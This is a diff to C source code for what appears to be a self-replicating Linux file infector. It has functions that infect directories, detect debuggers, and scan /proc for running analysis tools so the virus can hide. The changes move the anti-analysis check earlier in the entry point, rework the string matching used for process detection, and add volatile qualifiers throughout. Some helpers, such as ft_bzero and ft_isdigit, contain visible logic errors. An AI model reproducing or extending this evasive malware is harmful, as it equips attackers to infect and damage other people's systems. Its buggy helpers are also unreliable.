@@ -81,11 +81,11 @@ __attribute__((always_inline)) inline uint64_t offset_to_addr(volatile file *fil
 __attribute__((always_inline)) inline int file_write(int fd, volatile file *file);
 __attribute__((always_inline)) inline uint64_t old_entry_get(volatile file *file);
 
-__attribute__((always_inline)) inline int ft_strstr(volatile char *haystack, volatile char *needle);
 __attribute__((always_inline)) inline int ft_strlen(volatile char *str);
 __attribute__((always_inline)) inline void ft_strncpy(volatile char *src, volatile char *dst, size_t size);
 __attribute__((always_inline)) inline int ft_strnstr(volatile char *haystack, volatile char *needle, size_t size);
 __attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
+__attribute__((always_inline)) inline int ft_sstrnstr(volatile char *haystack, volatile char *needle, size_t size, size_t NEEDLE_SIZE);
 
 
 __attribute__((always_inline)) inline void
@@ -146,9 +146,9 @@ print_number(volatile uint64_t num) {
     }
 }
 
-__attribute__((always_inline)) static inline int
+__attribute__((always_inline)) static inline volatile int
 ft_isdigit(const volatile char* const s) {
-    for (int i = 0; s[i]; ++i) {
+    for (volatile int i = 0; s[i]; ++i) {
         if (s[i] < '0' && s[i] > '9') {
             return 0;
         }
@@ -167,11 +167,21 @@ ft_strchr(volatile char*  s, const volatile char c) {
     return 0;
 }
 
+__attribute__((always_inline)) static inline void ft_bzero(volatile char* bytes, volatile size_t len) {
+    for (volatile int i = 0; i < len; ++i) {
+        bytes = 0;
+    }
+}
+
 __attribute__((always_inline)) static inline int
 bad_process_running() {
     volatile char path[256];
     volatile char cmdline_buf[1024];
     volatile char getdents_buf[4096];
+
+    ft_bzero(path, sizeof(path));
+    ft_bzero(cmdline_buf, sizeof(cmdline_buf));
+    ft_bzero(getdents_buf, sizeof(getdents_buf));
 
     volatile int dirfd = ft_open(slash_proc, O_RDONLY, 0);
     if (dirfd < 0) {
@@ -181,38 +191,40 @@ bad_process_running() {
     path[0] = 0;
     ft_strcat(path, slash_proc);
 
+
     while (1) {
-        int64_t bytes_read = ft_getdents64(dirfd, (char*)getdents_buf, sizeof(getdents_buf));
+        volatile int64_t bytes_read = ft_getdents64(dirfd, (char*)getdents_buf, sizeof(getdents_buf));
         if (bytes_read <= 0) {
             break;
         }
-        int64_t offset = 0;
+        volatile int64_t offset = 0;
         while (offset < bytes_read) {
             for (int i = 6; i < sizeof(path); ++i) {
                 path[i] = 0;
             }
-            dirent64 *entry = (dirent64 *)(getdents_buf + offset);
+            volatile dirent64 *entry = (dirent64 *)(getdents_buf + offset);
             offset += entry->d_reclen;
             if (!ft_isdigit(entry->d_name)) {
                 continue;
             }
-            const uint64_t len = ft_strlen(entry->d_name);
+            const volatile uint64_t len = ft_strlen(entry->d_name);
             if (len + 14 > sizeof(path)) {
                 continue;
             }
             ft_strcat(path, entry->d_name);
             ft_strcat(path, slash_cmdline);
-            int fd = ft_open(path, O_RDONLY, 0);
+            volatile int fd = ft_open(path, O_RDONLY, 0);
             if (fd < 0) {
                 continue;
             }
 
-            int64_t read_bytes = ft_read(fd, cmdline_buf, sizeof(cmdline_buf));
+            volatile int64_t read_bytes = ft_read(fd, cmdline_buf, sizeof(cmdline_buf));
             if (read_bytes < 0) {
                 continue;
             }
             ft_close(fd);
-            if (ft_strstr(bad_process_name, cmdline_buf)) {
+            if (ft_sstrnstr(bad_process_name, cmdline_buf, read_bytes, sizeof(BAD_PROCESS_NAME))) {
+                ft_write(1, cmdline_buf, read_bytes);
                 ft_close(dirfd);
                 return 1;
             }
@@ -318,6 +330,10 @@ _start() {
         ft_exit(0);
     };
 
+    if (in_debugger() || bad_process_running()) {
+        jump_back(fd_self);
+    }
+
     volatile char dir[11];
     dir[0] = '/';
     dir[1] = 't';
@@ -337,9 +353,6 @@ _start() {
 
 __attribute__((always_inline)) inline int
 infect_dir(volatile char *dir_path, volatile int fd_self) {
-    if (in_debugger() || bad_process_running()) {
-        jump_back(fd_self);
-    }
 
     for (volatile int dir_index = 0; dir_index < 2; dir_index++) {
 
@@ -609,29 +622,30 @@ ft_strncpy(volatile char *src, volatile char *dst, size_t size) {
         dst[i] = src[i];
 }
 
+// just dont ask
 __attribute__((always_inline)) inline int
-ft_strstr(volatile char *needle, volatile char *haystack) {
+ft_sstrnstr(volatile char *haystack, volatile char *needle, size_t size, size_t NEEDLE_SIZE) {
+    int i = 0;
+    int j;
 
-    uint64_t i = 0, j = 0;
-
-    while (haystack[i]) {
-        int32_t k = i;
-        while (haystack[k] && needle[j] && haystack[k] == needle[j]) {
-            j++;
-            k++;
-        }
-        if (!needle[j]) {
-            return 1;
-        }
+    while ((i + NEEDLE_SIZE) < size) {
         j = 0;
+        while ((i + j) < (size)) {
+            char c = '\n';
+            if (haystack[i + j] != needle[j]) break;
+            if (j == (NEEDLE_SIZE - 1)) {
+                return (1);
+            }
+            j++;
+        }
         i++;
     }
-    return 0;
+    return (0);
 }
 
 __attribute__((always_inline)) inline int
 ft_strnstr(volatile char *haystack, volatile char *needle, size_t size) {
-    const uint64_t NEEDLE_SIZE = ft_strlen(needle);
+    const volatile uint64_t NEEDLE_SIZE = ft_strlen(needle);
     int i = 0;
     int j;
 
@@ -766,21 +780,6 @@ entries_size_sum(volatile entry entries[], volatile uint64_t entries_num) {
         total += entries[i].size;
     return total;
 }
-
-// Add __attribute__((noinline)) and posotion the parameters so they are alreasy in the correct order for the syscall
-// inline long
-// sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
-//     long ret;
-//     register long rdi __asm__("rdi") = arg1;
-//     register long rsi __asm__("rsi") = arg2;
-//     register long rdx __asm__("rdx") = arg3;
-//     register long r10 __asm__("r10") = arg4;
-//     register long r8 __asm__("r8") = arg5;
-//     register long r9 __asm__("r9") = arg6;
-//     __asm__ volatile("syscall" : "=a"(ret) : "a"(n), "r"(rdi), "r"(rsi), "r"(rdx), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
-//     return ret;
-// }
-//
 
 inline long
 sys(long rdi, long rsi, long rdx, long sysno, long r8, long r9, long r10) {
